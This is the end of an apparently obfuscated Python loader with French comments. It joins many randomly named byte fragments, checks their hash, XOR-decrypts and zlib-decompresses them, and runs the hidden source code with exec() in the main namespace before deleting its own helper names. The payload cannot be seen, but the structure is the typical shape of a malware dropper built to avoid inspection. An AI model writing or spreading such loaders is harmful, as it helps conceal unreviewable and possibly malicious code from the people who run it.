_czmx4GPXFT0W37 + _cbM24COCOu3cd5 + _cen34XxAeRAgPK + _cfosDlih5aOWIb + _csFX7g_hElzQD6 + _cddk1prRa16gOJ + _cdJPhqsiZGwMtk + _cjA10lxS2YgD4q + _cuDSJE2xFocuPz + _cuDmu1IoYmt_ZT + _cfrDNRl80y1iam + _cq8H_YOfcDEknN + _cutqIOH2RK3kp8 + _cplyxcBGvG_n0p + _cr2UcKkhTNEDPP + _cinoglYJaVDCDD + _cprxE0r7RMOWxw + _cka9f7ozYlMeui + _clE8oGiYFhC3gR + _cs0Z79O31DT267 + _cg5zexR7G8OzkN + _cxkeMhI1iz8WqW + _caH56wi7Yr2c9J + _csNN3jiaog9flG + _cnlDVEryTIS8Km + _cuIRrkciKyku4c + _cxvHoN4ljVdsO_ + _cbpL4QHjyjBuys + _chECuonL_HWPHi + _ceJtlSHp9sYU0S + _cl4qeuQQeCiRLD + _cd6u0gTsVZRiYO + _chJM5mexB7F_lb + _ck7N131lfzcSBH + _cnaZK_hPXhfY2a + _cwODlesJ43JxU_ + _clDWfvg_Hj0sJu + _cj0mvW0AjsXLCI + _cnrBInEn2QiFqZ + _cfJiwkwRCmg6az + _cc7R3e3kv5OWpX + _ctbbNE2iyaBMKz + _cwDrDaGL6sSV98 + _cdfBlNFd8JAyYd + _cgeE5I1vbSiHfQ + _cses8vjLxjqsw9 + _chynKEN7CgqJ6v + _ctgg5RG3DkUEpe + _clEVCgrwEWkGAu + _cachWFQqTz8Twf + _clPfCchGZfn9wq + _cdX6eYDnTvpZ_Z + _cioiqcsb2__9TU + _cgjxvzXChZ6ZPx + _crgpgdiueNyoEr + _cgcIV_Qjeo2JPP + _cmNCXepYECyEV5 + _ccNKdXwq6A8KG3 + _cp0Mcirj2dMgLT + _cxQS7Hkm0rW3tG + _ctngbBj5UI7nOQ + _conxVgb0Fxto9L + _cvf_EFderd1MTo + _cxTcjazKJihclS + _cu9B2nsKqWZdOR + _ctbM6tBJIdKkNE + _coTlI25Not3sUE + _csXDBO3CEX0IoZ + _co6lSxLWS_puES + _ccseirDSRUUbTU + _ct9oezRqHB0HuG + _coQnoAckdYJNmV + _ciNanRK0zPpfqr + _cfLfT3LYDem_A6 + _czG02Z2JNtJMCj + _cfU7mEPIX8TweZ + _ce_KuqBhGEXPqo + _chc24rwm7vp0ox + _cv7HO6LKOKXRT7 + _czx7T_wenxqbBs + _cl8aLpzfw0yVgE + _cnBBt709sSbLu8 + _cu9ARwXWagEYPB + _cwtRmj3ayn3JVC + _cjYtz81457Mhgb + _cm2tmP340OroQN + _cyXW9GBU_TySPX + _chzqXZzKTh_G4M + _coEyK_vIReUuN9 + _cj8WqvaABuNhHu + _cn7sv0fFJQCh_F + _cr7_mWaoqqRV8j + _chpSllaAz9G2Ta + _cpUjA4f_4T5P4Z + _ctIgH9ChjdPqSM + _cqjG88N6Tgwg2Z + _cgHhYJaN9bwQOA + _clVoWZSKm3zscO + _cfOuQwHLVQQmSi + _cbrz9pNfav2Fle + _ctOzPi8uqoZ4Tb + _cpZ0OH7v7OmpFb + _cd7rEBEdsS6mNt + _cu5FnSFsOxQHGu + _cpHbgN9dV1bWD6 + _crHNDRvANWFZ7h + _cemzBCr_OykhJs + _ciIvxtxTRMNPgm + _ceKY0E76e6Rkpo + _ceUg7YWf9uR64F + _cgPxv1hKLVZpQK + _c_uGIl2Mj799kh + _ccLO2Kd3kmVDxY + _ctJFf0nm4TxYdN + _cx8eFMzj3MF2jM + _cuR1qa_Kcm4TzR + _cfVY67GnaQE5tt + _cweXTgUhFuOCr2 + _cvri7KNpgv8O34 + _c_Ft__agiDLtGl + _cwaNj0rpspAoIe + _ckv6SGgPipHcwy + _chs4Vgxs782fJE + _crBsqy52bvXEt2 + _cgVUEV4HlwukZD + _cvUBxKd1D20s12 + _cabGEwyxP1aZbD + _cei2nFXDrUxuPN + _cksXEbjPOuXos7 + _cqFLfi8Vp5pDio + _cabZKpYyLlc98y + _crKtXUeUsUQtAx + _cvRddl113yXndp + _ccXLXSt7XMd4_o + _csDzcplpqEmITl + _cijbSKtDfrcQ28 + _chT17Wte2P_BGy + _ctvc6zIUZoZkmy + _c_9a_h9moIWgbd + _co42HSY2IMd0m0 + _cdP0LYSWViDPDS + _cq6tyWW0NImyzz + _cdZ3KSRKRHSGaz + _ci4OUw2eEqvbDm + _crAoDMhe1BN8ck + _cgTW11b3JSM0jj + _csVZxavL70hg94 + _cuDxxv01YRhaLM + _cjom7cI3xeeI4J + _czQaPe1izff1zl + _ctLi71pWpLUzoE + _cyrIs3tMKKtFJ5 + _cts7vXVQtJmde6 + _ciWvHE_AIyVugc + _chLl97N_ctMu4s + _cjRG6_4a5BVkPi + _cxOeEV1ipCNLzf + _ccBstSTmh_jsNf + _cf6wwSkSuH7_y3 + _cp91rG13Q4Haw3 + _cg_FK9kmBoFWMR + _cnxDPjmjxmtkkb + _clrxqMkJUWyvY5 + _czePdhIIL1XZlL + _cuXLPu80MT1jY4)
if __import__('hashlib').sha256(_peeQrkIPXYh197).hexdigest() != 'ed0db5186b771702e060d2ec881e292cf295adb6455695cd0f349c6c243e264e':
    __import__('sys').exit(1)
_xbpojun_Aq5mGC = bytes([230, 77, 21, 164, 120, 99, 17, 58, 107, 129, 185, 32, 48, 189, 132, 160, 111, 114])
_fkjws5roOAE5glu = bytes([114, 12, 233, 122, 130, 191, 146, 33, 29, 189, 197, 245, 122, 188, 176, 250, 240, 17])

def _fxiDnBtMFnY4JRQ(_bozPw9X8WTjJdX, _k_yGP6p448L3QH):
    return bytes(_bozPw9X8WTjJdX[_ifPkBsoyNjQ_6F] ^ _k_yGP6p448L3QH[_ifPkBsoyNjQ_6F % len(_k_yGP6p448L3QH)] for _ifPkBsoyNjQ_6F in range(len(_bozPw9X8WTjJdX)))

def _fds8eqX0fTBBVjA(_teunSbkL0y1mCH):
    import zlib
    return zlib.decompress(_teunSbkL0y1mCH) # Un seul niveau de zlib ici pour simplifier

def _felcgZGBRveX087():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xa_o_1qFEJTTjC = _fxiDnBtMFnY4JRQ(_peeQrkIPXYh197, _xbpojun_Aq5mGC)
    # 2. Décompression Zlib
    _difKz9ikidVwMC = _fds8eqX0fTBBVjA(_xa_o_1qFEJTTjC)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _difKz9ikidVwMC.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _npKDZMTRnTtCIm = _main.__dict__
    _npKDZMTRnTtCIm.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _npKDZMTRnTtCIm)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_felcgZGBRveX087()
try:
    del _fxiDnBtMFnY4JRQ, _fds8eqX0fTBBVjA, _felcgZGBRveX087
    del _peeQrkIPXYh197, _xbpojun_Aq5mGC, _fkjws5roOAE5glu
except:
    pass
